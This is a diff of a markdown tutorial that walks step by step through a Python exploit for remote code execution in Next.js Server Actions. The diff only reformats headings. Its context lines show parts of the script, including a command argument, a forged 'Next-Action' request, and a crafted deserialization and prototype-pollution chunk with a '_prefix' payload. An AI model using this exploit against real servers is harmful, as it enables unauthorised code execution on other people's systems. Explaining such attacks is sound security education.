@@ -105,7 +105,7 @@ Like the Windows IIS script you looked at earlier, the ultimate goal here is to 
 
 Here is a step-by-step breakdown of how this modern web exploit works from the ground up.
 
-> 1. The Setup & Arguments
+**1. The Setup & Arguments**
 ```Python
 # dependencies = ["requests"]
 import requests
@@ -124,7 +124,7 @@ EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
 
 > sys.argv[2] sets the system command to execute (defaulting to id, a standard, harmless Linux command used by researchers to prove read access to system execution).
 
-> 2. The Delivery Mechanism (Server Actions)
+**2. The Delivery Mechanism (Server Actions)**
 ```Python
 files = {
     "0": (None, json.dumps(crafted_chunk)),
@@ -141,7 +141,7 @@ res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
 
 > The script mimics this exact behavior by setting "Next-Action": "x" and sending two form-data chunks, tricking the server into parsing the payload as a legitimate internal state update.
 
-> 3. The Core Vulnerability: Deserialization & Prototype Pollution
+**3. The Core Vulnerability: Deserialization & Prototype Pollution**
 > The magic happens inside the crafted_chunk dictionary. This payload exploits a vulnerability in how the Node.js backend deserializes (unpacks) the incoming Flight data stream:
 
 ```Python
@@ -159,7 +159,7 @@ crafted_chunk = {
 
 > Fake Promises (then, resolved_model): Next.js uses asynchronous Promises to handle streaming data. By naming properties then and setting the status to resolved_model, the payload tricks the framework into thinking this malicious object is a completed internal task, forcing the server to evaluate the code inside.
 
-> 4. The Payload: Hijacking Node.js
+**4. The Payload: Hijacking Node.js**
 > Once the JavaScript engine is tricked into compiling text into executable code, it runs the string located in _prefix:
 
 ```Python
